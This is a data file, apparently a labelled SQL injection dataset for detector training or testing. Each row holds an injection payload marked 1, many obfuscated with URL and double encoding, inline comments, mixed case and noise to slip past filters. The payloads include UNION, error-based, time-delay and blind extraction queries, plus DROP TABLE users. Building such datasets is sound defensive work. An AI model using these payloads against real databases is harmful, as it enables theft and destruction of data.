"1%%32%39%2520UNION%2520SE%4cECT%2%35201%2Cdatab%61se%28%29%2C3 # more_nois%65--", 1
"' And extrActVaLUE(1,ConcAT(0X5C,versiOn()))--", 1
"1/**/ANd/*%2a/%31=1#3pu6gn5", 1
"%u%30%3027%u%30020OR%u00201%3D%31%u0020--%u0020", 1
"'/*!*/OR EXISTS(SELECT 1 FROM users)--", 1
"'ANd%0d%0A1=1--", 1
"%27UNIONSELECTnull%2Cnull%2Cnull OR (1)--%2F%2A%250a%2A%2F", 1
"test%27%2520OR%20%271%27%3D%271%27%20%252f%2A OR (1)", 1
"1))/**/%55%4e%49%4fN/**/SELECT/**/1,database(),3/**/OR/**/%27b'='b'----vlx8jq", 1
"1%U0027/**/unioN/**/selEct/**/TABlE_NamE,/**/NUlL,/**/NULL/**/fROM/**/InfORmAtION_ScHEMa.tabLES/**/--", 1
"admin' XOR '1'='1--dwnupvvifeec", 1
"1%27%20and%20sUBstRING%28DaTABAse%28%29%2C%201%2C%201%29%20%3D%20%27S%27%20----9qfyxix3ny1i", 1
"tesT' oR '1'='1' --", 1
"test'/*!12345*/OR %271'='1%27 /*", 1
"wAItFoRdelay%0a%u00270:0:5%u0027--%0a", 1
"%27%20XO/*!12345*/R%201%3D1%20--%20", 1
"'/**/AnD/**/1=coNVeRt(InT,@@VeRSIoN)/**/AND/**/'a'='a'--", 1
"%31%27%20OR%%320a%73cii%28substring%28database%28%29%2C%201%2%43%201%%329%29%20%3E%2010%30%20%2d-", 1
"TESt'or'1'='1'/*%0a", 1
"1'ORIF(substring(database(),1,1)IN (1)'a',SLEEP(5),/*%0a*/0)----dirjve941ok5dm", 1
"; drop TabLe UsERs;  oR 'b'='b'--#I957G44L", 1
"admin'OR'1'='1%0d%0a", 1
"1%u0020XOR%u00201/**//**/=	1", 1
"1%27/**/AND/**/subs%74ring(databas%65%28),/**/1,%201%29/**/%3D/**/%27s%27/**/--", 1
"' XOR EXIStS(SELeCT 1 FrOm usErS)--#diou43", 1
"1AND1=1", 1
"", 1
"1AND1=1OR(1)/*%0a*/", 1
"%27%20unIOn%20sElecT%201%2C2%2C3--", 1
"'          ||          EXISTS(SELECT          1          FROM          users) AND 'a'='a'--", 1
"'&&(1=1)1=ConvErT(INt,@@vERsion)----yw3SH5Zi9r7", 1
"", 1
"WAITFOR/**/DELAY '0:0:5'--", 1
"%27/**/AND%20extractvalue(1,concat(0x5c,version()))--#1b4cpsowx", 1
"test%27/*!*%2fOR/**/%271'='1'/**//*", 1
"test'/**/OR/**/'1'='1'/**//*", 1
"'/**/AND extract%76a%6cue(1,concat(0x5c,v%65rsion())) OR 'b'=%27b'%2d%2d", 1
"1'UN%2f*!*/ION/*%0d%0a*/SE%4cECTta%62le_name,%6e%75ll%2c%0d%0anullFRO%4dinformation_%73che%6da.tables--", 1
"1%27%20OR%20If(SUbsTrINg(daTabASE(),%201,%201)%3d%27a%27,%20SLeEP(5),%200)%20--#Os2mdiXWYmG", 1
"%27%20OR%20%271%27%3D%271#v7cpoitly2af6l7", 1
";          SELECT          pg_sleep(5);          --#azfetcv4ub5rdn", 1
"'/*!12345*/AND/**/1=convert(int,@@version)--#fme64w0j754", 1
"'/*%2a%2fAND/*%2a/1<=con%76ert(int,@@version)--", 1
"%u0027%u0020AND%u00201=convert(int,@@version)----geeph", 1
"WAITFOR/**/DELAY/**/'0:0:5'--", 1
"test'/*!12345*/OR/**/'1'='1'/**//* OR 'b'='b'", 1
"'        OR        '1'%09=  '1", 1
"' OR EXISTS(SELECT 1 FROM users)----yzvfean4vc6", 1
"1'%09%09AND%09%09substring(database(),%09%091,%09%091)%09%09%20=%09%09's'%09%09&&/*%0d%0a*/(1=1)'a'='a'--", 1
"1 AND 1=1 AND 'a'='a'", 1
"1'XORascii(substring(database(),1,", 1
"1))>100--", 1
"test%u0027%u0020||%u0020%u00271%u0027=%u00271%u0027%u0020/*", 1
"'/**/AND/**/1=1/**/--/**/", 1
"%31/**/AND 1=1", 1
"1%27%20OR%20ascii(substring(database(),%201,%201))%20%3E%20100%20----iw0ml5djz", 1
"1/**/AND/**/1<=1--z37vzkt19ceo", 1
"'OR%0a'1'LIKE'1", 1
"", 1
"'/**/AND/**/1=1/**//**/--/**/random_noise--/**/", 1
"%3b%20DROP%20TABL%45%20us%65rs;%20%20OR%20(1)--", 1
"1%27%09%09%09or%09%09%09if(SubSTRiNG(DaTabAse(),%09%09%091,%09%09%091)/**//**/%3D/**/%27a%27,%09%09%09slEEP(5),%09%09%090)%09%09%09--", 1
"1)/**/unIon/**/seLecT/**/1,DaTaBaSE(),3--#yVi35FXT0KO", 1
"1%u0027/*!*/UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
";%20DROP%20TABLE%20users;%20--#ggnkgqanbcbmuj", 1
"1'/**/AND substring(database(), 1, 1) = 's' --", 1
"'/*!*/OR 1=1  OR (1)-- #vffh3", 1
"%3B%20DROP%20TABLE%20users%3B%20%20OR%20%281%29--%23ru5edj3w", 1
"' %4fR '1'='%31", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)IN (1)'a', SLEEP(5), 0) --", 1
"' union seLeCT nULL, NuLl, NUlL --", 1
"1'/**/UNION SELECT table_name, null, null FROM information_schema.tables --#b2nad24fhs3f41m", 1
"WAITFOR%2f*!1%32345%2a/DEL%41Y '0:0:5'----er%68k5wwh72d3vn", 1
"'/**/XOR extractvalue(1,concat(0x5c,version()))--", 1
"1) unION SElecT 1,daTABASe(),3--", 1
"%27%20&&%20(1%3D1)1%3D1%20--%20--rluk95ckzkj", 1
"'/*!12345*/AND 1=1 --", 1
"' OR 1>=1 --", 1
"1' AND substring(database(), 1, 1) = 's'  # more_noise----yh1b8q7fzr2o73", 1
"%27%20and%201%3c%3DcOnveRt(Int,@@versIoN)--", 1
";%09%09%09%09%09DROP%09%09%09%09%09T%41BLE%09%09%09%%309%%309%75sers;%0%39%09%09%09%%309--", 1
"1' uNIOn selecT taBLE_NamE, NULl, nUlL froM INformAtiON_scHEmA.TabLes --", 1
"1)%u0020UN/**/ION%u0020SELECT%u00201,database(),3--#k8pfz0q", 1
"test%25u0027%2F%2A%2A%2FOR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%2F%2A%20OR%20%281%29", 1
"1%27%20or%20Ascii%28SubsTRIng%28DAtabasE%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
"'OR/*%0a*/'1'='1#if9xt/*%0d%0a*/", 1
"tEst' Or '1'='1' /*--21nccciqlw6qyw", 1
"1%u0027/*!12345*/UNION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--", 1
"test%u0027%u0020OR%u0020%u00271%u0027IN (1)%u00271%u0027%u0020--%u0020#oecyguz2po", 1
"'/*!*%2fOR    1>%09=  1    %2d-", 1
"' || (1=1)'1'='1", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--", 1
"'/**/OR EXISTS(SELECT 1 FROM users) # more_noise----q4of8slrab", 1
"1' ANd SuBStRiNG(DatAbaS%65%28),%201,%201) = 's' -%2d", 1
"1%u0027/**/ANd/**/SUbStRinG(DaTabaSe(),/**/1,/**/1)/**/=/**/%U0027s%U0027/**/--#5Ry0nl1w", 1
"1%20AND/*!*/1=1", 1
";DROPTABLE/*%0d%0a*/users;--", 1
"'   UNION   SELECT   1,2,3----buwrbq1395h2kk", 1
"%u0027/*!*/OR%u00271%u0027=%u00271/*%0a*/", 1
"1/**/A/*!12345*/ND/**/1=1 -- random_noise", 1
"admin%27%20OR%20%271%27%3D%271--fjier5ui", 1
"test'OR%0d%0a'1'='1'/*%0d%0a*//*%0d%0a", 1
"'/**/AND/**/extractvalue(1,concat(0x5c,version()))  #  more_noise--#du66dd6gr", 1
"tESt'/%2a*/Or/**/'1'='%31'%2f**/%2d-/**/", 1
"1'ANDsubstring(database(),1,1)%0d%0a='s'%0d%0a----7so61/*%0a*/", 1
"wAitFOR dEla%59 '0:0%3a5'%2d-", 1
"%u0027%u0020OR%u0020%u00271%u0027=%u00271", 1
"1'ORIF(substring(database(),1,%0d%0a1)	=%20'a',SLEEP(5),", 1
"0)--", 1
"admin%27%20OR%20%271%27%3D%271#pnak1bxukd2b84", 1
"1%27%20A/*!*/ND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20--", 1
"1'/*!12345*/ORIF(substring(database(),1,1)IN(1)'a',%0d%0aSLEEP(5),0)--#dtgrby527", 1
"'/**/AND extractvalue(1,concat(0x5c,version()))--", 1
"'/*!*/oR '1'='1--lnep2EaPrZ7977g", 1
"test%25u0027OR%250d%250a%25u00271%25u0027%3D%25u00271%25u0027%2F%2A%250d%250a", 1
"' xOR 1=1 --", 1
"%2527%2520UNION%2520SELECT%25201%2C2%2C3%20%2F%2A%21%2A%2FAND%201%3D1--", 1
"%27%20AND%201%3Dconver%74%28i%6et,@@version)---%2dyrqkhm%645ko", 1
"1))/*!12345*/UNION SELECT 1,database(),3 OR 'b'='b'--", 1
"%U0027%U0020%41ND%20eXtRaCTVA%6cUE(1,co%6ecAT(0x5c,veRsI%6Fn()))--", 1
";SELECTpg_sleep(5);OR'b'='b'----j104gd5dn", 1
"", 1
"'		AND		1%3dconve%72t(i%6et,@@versi%6fn)--", 1
"' XOR '1'='1--v6anu6of2uc5", 1
"1'/**/unIoN/**/SelEcT/**/tablE_name,/**/NuLl,/**/NulL/**/FrOm/**/INformATIoN_scHEma.tAbLEs/**/--", 1
"' and 1=1 -- --6tu1wx57nbg", 1
"'/*!12345*/AND 1<=1 --", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))--", 1
"'/*!*/AND					extractvalue(1,concat(0x5c,version()))--", 1
"' AND extractvalue(1,concat(0x5c,version())) AND 'a'='a'--", 1
"%27 OR '%31'='1", 1
"'/**/OR/**/E%58%49%53%54S(SELECT/**/1/**/FROM/**/users)--", 1
"1)UNION/*%0a*/SELECT1,database(),3--", 1
"TESt'    or    '1'%09=  '1'        --    rAndOM_nOiSE--", 1
"test%27%20OR%20%271%27%3D%271%27%20%2F%2A", 1
"' AND extractvalue(1,concat(0x5c,version()))--#74cmn0p6", 1
"%27%20OR%20%271%27%3D%271%20OR%20%27b%27%3D%27b%27", 1
"1'/**/UNION SELECT table_name, null, null FROM information_schema.tables --", 1
"WAITFOR%2520DELAY%2520%25270%3A0%3A5%2527 -- random_noise--", 1
"WAITFORDELAY", 1
"'0:0:5' OR 'b'='b'--%0a", 1
"' UNION SELECT null, null, null -- --uwclkghb", 1
"1' Or asCIi(SUbstRINg(dATAbaSE(), 1, 1)) > 100 --", 1
"' OR '1'='1--%7ax%7a2j%63cuesa4c", 1
"'OREXISTS(SELECT", 1
"1%0d%0aFROMusers)%20%20%20#%20%20%20more_noise--/*%0a*/", 1
"WAITFOR					DELAY					'0:0:5'--", 1
"%u0027%20%20OR%20%20EXISTS(SELECT%20%201%20%20FROM%20%20users) AND 'a'='a'--", 1
"' OR '1'IN (1)'1", 1
"TEST%27oR/*%0a*/%271%27%3D%271%27", 1
"/*%0A", 1
"%3B%2520D%2552OP%2520TABLE%2520u%2573ers%3B%2520--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020--", 1
"%u0027		AND		1%09=%09convert(int,@@version)--", 1
"%31 AND 1=1", 1
"%27%20UN/**/ION%20SELECT%20null,%20null,%20null%20--%20", 1
"'/*%211%32345*/AN%44 1=1 --", 1
"' or exists(SelecT 1 FRoM UsERs)--", 1
";DROPTABLEusers;/*%0a*/", 1
"OR'b'%20=%09'b'--#hjmbnw5p", 1
"WAITFORDELAY%2F%2A%250a%2A%2F%270%3A0%3A5%27%250d%250a%23%0Amore_noise--", 1
";    DroP    tABle    uSERS;     Or 'b'='B'--", 1
"1'%20%20AND%20%20substring(database(),%20%201,%20%201)%20%20	=	%20%20's'%20%20/**/AND/**/'a'='a'--", 1
"%u0027/**/OR/**/%u00271%u0027=%u00271", 1
"' OR EXISTS(SELECT 1 FROM users) -- random_noise--#fu8ur4", 1
"' || (1=1)%271%27='1", 1
"; DRop tABLE usERs; ----pmt8j8p9", 1
"1'/*!*/or iF(sUBSTring(DataBAsE(), 1, 1)='A', SLeeP(5), 0) --", 1
"'/*!12345*/AnD 1in (1)ConverT(INt,@@vErSioN)--", 1
"1%u0020AND%u00201=1#5zyr6688bzd", 1
";SELECTpg_sleep(5);/*%0a*/--%0a", 1
"1' UNiOn sELecT TAblE_naME, nuLL, NULL fRoM inFoRmaTiON_SchEmA.taBlEs --", 1
"WAITFOR/*!12345*/DELAY '0:0:5'--", 1
"ADMin%2%37%20oR%2%30%271%%327%3d%271", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20--%23q2nouilv", 1
"'oR%45XIsts(seLect%201", 1
"fr%4fM/*%0d%0a*/UseRS%29--/*%0a*/", 1
"1'UnIONsEleCt%0atABLe_nAMe,nUlL,NulLFROMinForMAtion_SChEMA.tABLEs/*!*/AND1=1--", 1
"1' || (1=1)asciI(suBStrING(daTABaSE(), 1, 1)) > 100 --", 1
"test%u0027/**/OR/**/%u00271%u0027	LIKE%20%u00271%u0027/**/--/**/", 1
"admin'/*!*/OR'1'='1", 1
"", 1
"1%27%20OR%20IF%28sub%2573tring%28datab%2561%2573e%28%29%2C%201%2C%20%2531%29%3D%27a%2527%2C%20SLEEP%285%29%2C%200%29%20-%252d", 1
"%31'O/**/Ra%73%63ii(subst%72ing(database%28),1,", 1
"1))>100%0d%0a--/*%0a*/", 1
"'/*!*/OR1=1%0a--", 1
"WAITFOR DELAY '0:0:5' AND 'a'='a'--", 1
"'%20%20%20%20OR%20%20%20%20'1'%09=  '1#hi63iil9hx3ku", 1
"%25u0027%25u0020%7C%7C%25u0020%281%3D1%291%3D1%25u0020--%25u0020", 1
"test' || '1'='1'  OR 'b'='b'--", 1
"%27%20U%4eION%20SELEC%54%2%301,2,3--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20--", 1
"1 AND 1=1 OR (1)", 1
"1))%u0020UNION%u0020SELECT%u00201,database(),3 /*!*/AND 1=1--", 1
"1%20AND%201%3D1 /*!*/AND 1=1", 1
"1%29)/**/%55%4EION/**/sELECT/**/1,%64aTABASe(),3--", 1
"'	||	EXISTS(SELE%43T	1	FRO%4d	%75s%65rs)--", 1
"%27aNd/*%0d%0a*/1%3DConvERT(iNT,@@VersioN)--%0d%0a", 1
"%27%09%09%09AND%09%09%0%391%20%3D%09convert(i%6et,@@%76%65rs%69%6fn)----3k8xsqen", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20", 1
"1)UNION%0aSELECT", 1
"1,database(),3--", 1
"1/*!*/AND/**/1=1 AND 'a'='a'", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29----kwga0", 1
"1'/**//**//**//**//**//**//**//**//**//**/AND/**//**//**//**//**//**//**//**//**//**/substring(database(),/**//**//**//**//**//**//**//**//**//**/1,/**//**//**//**//**//**//**//**//**//**/1)/**//**//**//**//**//**//**//**//**//**/%09=/**//**//**//**//**//**//**//**//**//**//**//**/'s'/**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**//**/OR/**//**//**//**//**//**//**//**//**//**/(1)--", 1
"1))%u0020UnION%u0020sELECT%u00201,dataBASE(),3--", 1
"1/**/AND%201%3D1", 1
"1'/*!12345*/OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0) --", 1
"' OR '%31'>=%271", 1
"test%27/**/OR/**/%271%27%3D%271%27/**//*", 1
"test%27%20||%20(1%3d%31)%271%27%3D%271%27%20/*", 1
"1)) UNION SELECT 1,database(),3 OR (1)--", 1
"' And ExtRactvAluE(1,COnCat(0X5C,VeRsION()))--", 1
"' OR %271'>='%31", 1
"%U0027%20%20%20a/**/nd%20%20%20extRacTVaLUE(1,concat(0X5C,vErsiON()))--", 1
"test%27%20||%20%271%27%3D%271%27%20--%20", 1
";seLEct", 1
"pG_sleEp(5);/*%0D%0A*/--/*%0a*/", 1
"t%65St' oR '1'%3D'1' %2d-", 1
"%27/**/ANd/**/1%3d1/**/--/**/", 1
"admin' OR '1'<='1", 1
"1%20%20AND%20%201%09LIKE  1 OR 'b'='b'", 1
"%27%09AND%091%20LIKE%201%09--%09--b3171", 1
"' XOR 1=1 --", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29OR/*%0a*/'b'='b'--", 1
"", 1
"1))/*!12345*/    UNION     SELECT     1,database(),3--", 1
"'/*!*/AND 1=1 --", 1
"%27%09%09AND%09%09extractvalue(1,concat(0x5c,version()))--", 1
"'/*!*/AND extractvalue(1,concat(0x5c,version()))--", 1
"1))%20UNION%20SELECT%201,database(),3--", 1
";/**/SEL/*!*/ECT/**/pg_sleep(5);/**/----hb3dgfxx8bji", 1
"%27%20OR%20%27%31%27%3D%271", 1
"1'/**/ANd/**/subsTRING(datAbAse(),/**/1,/**/1)/**/>=/**/'S'/**/----cvca5s51tzm", 1
"WAITFORDELAY%0a'0:0:5'AND'a'%09=%20'a'--/*%0a*/", 1
"test%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271%25u0027%25u0020%2F%2A", 1
"1%20aNd%201%3d1", 1
"'%09%09%09%09OR%09%09%09%091%20IN (1)  1%09%09%09%09--%09%09%09%09", 1
"%27%20UN/**/ION%20SELECT%201,2,3--", 1
"test%u0027%u0020||%u0020%u00271%u0027IN%u0020(1)%u00271%u0027%u0020/*", 1
"1'					OR					IF(substring(database(),					1,					1)  =%20'a',					SLEEP(5),					0)					--", 1
"'%09%09%09And%09%09%091	= 1%09%09%09--%09%09%09", 1
"'/**/AND/**/1LIKEconvert(int,@@version)--", 1
"admin%27%20OR%20%271%27%3E%3D%271", 1
";/%2a%2a/S%45LECT pg_sleep(5);  # more_noise%2d%2d#vfs3k64gqi0f2", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29 -- random_noise--#xh8tbs", 1
"' OR '1'='1--08gq5", 1
"' || '1'='1--tu0wfh29etqp", 1
"1'%20%20UNION%20%20SELECT%20%20table_name,%20%20null,%20%20null%20%20FROM%20%20information_schema.tables%20%20----4ejzyt0rr", 1
"%3B%20DROP%20TABLE%20users%3B%20----6u9ddf8ja30kp5", 1
"%27/*!*/AND/**/extractvalue(1,concat(0x5c,version()))%20/*!*/AND%201%3D1--", 1
"1%27%20OR%20IF(substrin%67(datab%61se(),%201,%201%29%3D%27%61%27,%20SLEEP(5),%20%30)%20--#nz6w1cutjpqsnfs", 1
"'XORextractvalue(1,concat(0x5c,version()))--#af1lshjgj/*%0a*/", 1
"; DROP TABLE u%73er%73; -%2d", 1
"1%27%4fRIF%28substring%%328databas%65%28%29%2C1%2C1%%329%3D%27%61%27%2CSLEEP%285%29%%32C0%2%39%250d%250a-%2d--7phlawth", 1
"1)/*!12345*/UN%49%4fN SELECT %31%2cdatabase(),%33--", 1
"%27%20UNI%4fN%20SELECT%20%31,2,3-%2d--%30j0sdt0yb", 1
"test%27%2F%2A%21%2A%2FOR%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F%2F%2A%2A%2F--%2F%2A%2A%2Frandom_noise--%2F%2A%2A%2F", 1
"1)/**/UNION/**/SELECT/**/1,database(),3/**/#/**/more_noise--", 1
"1'ORascii(substring(database(),1,1))/*%0d%0a*/>100 /*!*/AND 1=1--", 1
"", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20----awi96jc41l1", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))%20OR%20%27b%27%3D%27b%27----511yx1j56", 1
";%u0020DROP%u0020T%41BLE%u0020users;%20-%2d -- random_noise", 1
"1))%20UNION%20SELECT%201,database(),3%20AND%20%27a%27%3D%27a%27--", 1
"%27%2520%2520%2520AN%2544%2520%2520%25201%20%20%3D%2509conve%2572t%28int%2C%40%40ve%2572sion%29%252d-", 1
"; SeLECT Pg_SLeep(5); --", 1
"%27%2F%2A%2A%2FUN/*!12345*/ION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2C2%2C3--", 1
"%74est%u0027%u0020OR%%7500%320%u00271%u0027%%33D%u002%371%u%30027%u0020--%u0020", 1
"; DROP TABLE users;  -- random_noise--#28o08uow", 1
"%u0027%09%09%09%09OR%09%09%09%091%0a=	1%09%09%09%09--%09%09%09%09#7f2htoqe3d2ftq%0d%0a", 1
"'%2f**/OR%2f**/EXIST%53(SELECT/**/1/**/FROM/**%2fusers%29--", 1
"test'%20%20%20%20OR%20%20%20%20'1'	IN (1) '1'%20%20%20%20 OR 'b'='b'--%20%20%20%20", 1
"1%27%20%20%20%20O/**/R%20%20%20%20ascii%28substring%28database%28%29%2C%20%20%20%201%2C%20%20%20%201%29%29%20%20%20%20%3E%20%20%20%20100%20%20%20%20--", 1
"1'/**/or/**/ASCiI(SUBstRinG(DatabAse(),/**/1,/**/1))/**/>/**/100/**/--#kdm437r", 1
";SELECT%0d%0apg_sleep(5);%0a--%0a", 1
"test'%20OR%20'1'  >=%09'1'%20/*", 1
"1'ORascii(substring(database(),1,1))>/*%0d%0a*/100--", 1
"'%20%20%20%20AND%20%20%20%201	=%201%20%20%20%20--%20%20%20%20", 1
"1%2527%2520oR%2520IF%28subsTRING%28DaTABaSE%28%29%2C%25201%2C%25201%29%253d%2527a%2527%2C%2520SLeEP%285%29%2C%25200%29%2520--", 1
"'/*!12345*/OR%09%09EXISTS(SELECT%09%091%09%09FROM%09%09users)--", 1
"%27%20UNION%20SELECT%201%2C2%2C3----x5fuyarjs", 1
"'          AND          extractvalue(1,concat(0x5c,version()))          --          random_noise--", 1
"'UNION/*%0d%0a*/SELECT/*%0d%0a*/1,2,3--", 1
"", 1
"%74est'%%320%2%30%20%20%20XOR%20%20%20%20%20'1'	=%09'1'%%320%20%20%%320%20/%2a", 1
"%27 %4fR 1=1  OR (1)--", 1
"test'OR'1'>='1'/*%0d%0a*/--%0d%0a", 1
"1' OR I%46%28subs%74ring(%64atabase(), 1, 1)LIKE'a', SLE%45P(%35), 0) ----giush9xwdwmsz", 1
"t%65st' %4fR '1'='1' /*", 1
"1%u0027%u0020OR%u0020IF(substring(database(),%u00201,%u00201)=%u0027a%u0027,%u0020SLEEP(5),%u00200)%u0020--#jcwtwjkn6he5d", 1
"%27%20%20%20%20OR%20%20%20%20%271%27%2520%3D%09%271#s84fqw6d2", 1
"1))%20%20UNION%20%20SELECT%20%201,database(),3--#yuyw7bjtm8p3", 1
"'OR'1'='1%0a", 1
"1' OR ascii(substring(database(), 1, 1)) > 100  AND 'a'='a'--", 1
"%27%2%46%2A%%32A%2FOR%2F%2A%2A%2FEXISTS%28SELE%43T%2F%2A%2A%2F1%2F%2A%%32A%%32F%46ROM%2F%%32%41%2A%2Fusers%29--", 1
"1%25u0027%2F%2A%2A%2For%2F%2A%2A%2FaSCII%28SUbStrINg%28datABaSe%28%29%2C%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%29%2F%2A%2A%2F%3E%2F%2A%2A%2F100%2F%2A%2A%2F--", 1
"' A%4e%44 1=co%6evert(int,@@version%29--", 1
"'				OR				EXISTS(SELECT				1				FROM				users)				--				random_noise--", 1
"1%2520AND%25201%253D1", 1
"1)) UNION SELECT 1,database(),3 # more_noise--", 1
"1%27/**/UNION/**/SELECT/**/table_name,/**/null,/**/null/**/FROM/**/information_schema.tables/**/----ubdydr36y1", 1
"%u0027/**/OR%u0020%u00271%u0027=%u00271#3ct7szvdj10jntt", 1
";/*!*/SELECT%20pg_sleep(5);%20%20--%20random_noise--#qkd7f", 1
"'AND%201>=convert%28int,@@ver%73ion)%2d-OR/*%0a*/'b'='b'", 1
"%27 OR '1'=%271", 1
"'/*!*/OR '1%27%3d'1", 1
"'/*!12345*%2fUNIONSEL%45C%54/*%0d%0a*/1,2,3%2d-/*%0d%0a*/#amkruufxwhk", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20----2ubbqs6fupq", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20OR%20%281%29--", 1
"' And 1=cOnvErt(INT,@@VErsIOn)--", 1
"'		OR		1%09=  1		--		--lltwcf", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2F%271%27%3D%271", 1
"1%20A/*!12345*/ND%201%3D1#5Js57qvGwF", 1
"1' OR IF(substring(database(), 1, 1)<='a', SLEEP(5), 0) --", 1
"1%u0027%u0020UN/**/ION%u0020SELECT%u0020table_name,%u0020null,%u0020null%u0020FROM%u0020information_schema.tables%u0020--#90c093020r3zavd", 1
"%27%20A/**/ND%201IN%20(1)convert(int,@@version)--", 1
"test'%20||%20'1'%20=%09'1'%20/*", 1
"%27%20O/*!*/R%20%271%27%3D%271", 1
"1'%09%09UNION%09%09SELECT%09%09table_name,%09%09null,%09%09null%09%09FROM%09%09information_schema.tables%09%09--", 1
";%20DROP/**/TABLE%20users%3b --", 1
"test'%09OR%09'1'	= '1'%09--%09--niy72x9rccl3ydz", 1
"%u0027%20%20%20OR%20%20%20EXISTS(SELECT%20%20%201%20%20%20FROM%20%20%20users)--#axyx6uitcyv", 1
";%u0020SELECT%u00%32%30pg_sleep%285);%u0%3020--", 1
"aDmin'/*!12345*/OR '1'IN (1)'1", 1
"'/**/AND/**/1>=convert(int,@@version)--", 1
"test' OR '1'='1' /* # more_noise--i78uyd8u25y5", 1
"1%27%2F%2A%2A%2FOR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20--", 1
";/*!12345%2a/S%45LECT pg_sle%65p(5); %2d-", 1
"test%27%2F%2A%2A%2FO/**/R%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"1%u0020AND%u00201=1 # more_noise--xl65a", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20----59s1i19hkyrf6v", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20 OR (1)--%20", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20--#fyxos1wecty", 1
"1) UNION SELE%43T %31,da%74abase(),3%20# more%5fnoise--", 1
"admin%27%20%20%20OR%20%20%20%271%27%20%3E%3D%20%271", 1
"1'ORIF(substring(database(),1,", 1
"1)>='a',SLEEP(5),%0d%0a0)--%0d%0a", 1
"' && (1 =%091)1 =%091 --", 1
";/**/DROP TABLE users; --", 1
"test' || (1=1)'1'%09=%20'1%27%20-%2d", 1
"1))UNIONS%45LECT%0d%0a1,data%62ase(%29,3OR%281)--", 1
"WAITFO%52 DELAY %270:%30:5'--", 1
"1AND/*%0a*/1=1/**//*!*/AND/**/1=1#6x7wfeohuhpat8%0a", 1
"1' OR IF(substring(database(), 1, 1)>='a', SLEEP(5), 0) --", 1
"test' OR '1'='1'  OR (1)--", 1
"%27AND/*%0a*/extractvalue(1,concat(0x5c,version()))--/*%0d%0a*/--x77yn8ygx2h", 1
";%09%09%09SELECT%09%09%09pg_sleep(5);%09%09%09--", 1
"%u0027%u0020AND%u00201IN%u0020(1)1%u0020--%u0020#75wq7", 1
"'%20an%44 ex%54rACtvaLu%45(1,ConcAT(0x5c%2cversiOn()))--", 1
"test' || (1=1)'1'='1' /*", 1
"1%u0027%09%09%09AND%09%09%09substring(database(),%09%09%091,%09%09%091)%09%09%09/*%0a*/=%09%09%09%u0027s%u0027%09%09%09 OR 'b'='b'--", 1
"'||/*%0a*/EXISTS(SELECT", 1
"1FROMusers)--/*%0a*/", 1
"1%27OR%250d%250aIF%28substring%28database%28%29%2C%2F%2A%250d%250a%2A%2F1%2C%250d%250a1%29%3D%27a%27%2CSLEEP%285%29%2C0%29--", 1
"test%27%20O%2552%20%271%27%3D%271%27%2520%20%2F%2A%21%2A%2FAND%201%253d%2531--%20--pcgkpi8x5a1mp5", 1
"1))UNION/*%0d%0a*/SELECT1,database(),3--", 1
"TeSt'%2F%2a!*/%4FR '1'='1' /*", 1
"1%%750020And%u%300201=1", 1
"1))/**/uniOn/**/seLEct/**/1,DAtabASe(),3--", 1
"te%73t%u0027%u0020O/*!12345*/R%u0020%u0%30271%u002%37=%u%300271%u0027%u0020--%%75%300%320", 1
"1'%20%20%20%20%20%7c|%20IF(%73%75bstring(database(),%20%20%20%20%201,%20%20%20%20%20%31)IN%20%20%20%20%20(1)'a',%20%20%20%20%20SL%45EP(5)%2c%20%20%20%20%200)%20%20%20%20%20--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20%20%23%20more_noise--", 1
"%3B%2520seLect%2520Pg_sLeeP%285%29%3B%2520--", 1
"%u0027/**/Or/**/%u00271%u0027=%u00271", 1
";/*!*/droP TAbLe uSErS; --", 1
"WAITFOR%20DELAY%2%30%270:%30:5%27%2f*%2a/--/**/random_%6eoise--", 1
"1%27%20A/*!*/ND%20substring(database(),%201,%201)%20%3D%20%27s%27%20--", 1
"admin'/**/OR/**/'1'='1", 1
"'/*!12345*/OR ExisTS(selECt 1 FRom UseRs)--", 1
"admin%u0027%u0020OR%u0020%u00271%u0027  =  %u00271", 1
"%27%2%30Or%20%271%27%%33d%271", 1
"%27%20UNION%20SELECT%201,2,3/*!12345*/AND 'a'='a'--#5z942ew5rbge", 1
"'UNI%4fNSELE%43T%2f*%0d%0a*/null%2cnull,null--", 1
"'/**/A%4ed%201=1/**/--%20--S1Rg3", 1
"%U0027%U0020ANd%u00201=COnveRT(InT,@@vErsION)--", 1
